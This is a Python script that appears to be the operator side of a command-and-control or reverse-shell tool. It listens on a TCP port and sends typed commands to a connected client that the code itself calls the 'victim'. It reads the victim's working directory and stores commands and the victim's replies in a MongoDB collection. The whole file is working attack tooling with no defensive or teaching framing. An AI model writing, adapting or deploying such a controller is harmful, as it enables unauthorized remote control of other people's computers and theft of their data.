#!/usr/bin/env python3
import socket
import threading
import pymongo
import time
import signal
from sys import exit

errors_might_happen = (pymongo.errors.ServerSelectionTimeoutError, socket.error, Exception, BrokenPipeError)
signal.signal(signal.SIGINT, signal.SIG_DFL)


class ServerTcp:

    def __init__(self, ip_server=socket.gethostname(), port=60555, db_link='mongodb://localhost:27017/',
                 db_name='my_ref_db', collection_name='data_got'):
        try:
            self.db_Client = pymongo.MongoClient(db_link)
            self.mydb = self.db_Client[db_name]
            self.mycol = self.mydb[collection_name]

            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            self.s.bind((ip_server, port))

        except errors_might_happen as e:
            print("Error in connection", e)
            return

        self.s.listen(5)
        print("Ur server is running")
        self.start_conn()

    def test_connection(self):
        while self.connection:
            time.sleep(2)
            try:
                self.client_socket.send("CHECKING CONNECTION".encode())
            except errors_might_happen:
                self.connection = False

    def start_conn(self):
        """Function that waits for client connection."""

        print("\n[ Waiting For Client ]\n")
        self.client_socket, self.address = self.s.accept()
        print("client address : ", self.address)

        self.connection = True
        self.test_conn = threading.Thread(target=self.test_connection)
        self.test_conn.daemon = True
        self.test_conn.start()

        self.connection_open()

    def connection_open(self):
        """Interacting with the connection."""
        self.connection, get_victim_pwd, swap = True, True, ''

        while self.connection:
            if get_victim_pwd:
                get_victim_pwd = self.client_socket.recv(100).decode()
                swap = get_victim_pwd
            else:
                get_victim_pwd = swap
            while self.connection:
                msg = input(f"{get_victim_pwd} > ").strip()
                if msg:
                    break
            if msg in ['exit', 'get_op', 'get_last']:
                get_victim_pwd = False
            if msg == 'exit':  # Close the server
                exit(0)
            elif msg == "get_op":  # show the collection data.
                for i in self.mycol.find():
                    print(i['data'])
            elif msg == 'get_last':  # get last return of victim.
                print(self.mycol.find_one({'sender': 'client'}, sort=[('_id', pymongo.DESCENDING)])['data'])

            else:
                get_victim_pwd = True
                try:
                    self.client_socket.send(msg.encode())
                    self.mycol.insert_one({"data": msg, 'sender': 'SERVER'})
                    print("\n[[sent]]\n")

                except errors_might_happen as e:
                    print("Connection is Closed : ", e)
                    self.start_conn()


while True:
    ServerTcp(port=50000)
    time.sleep(2)
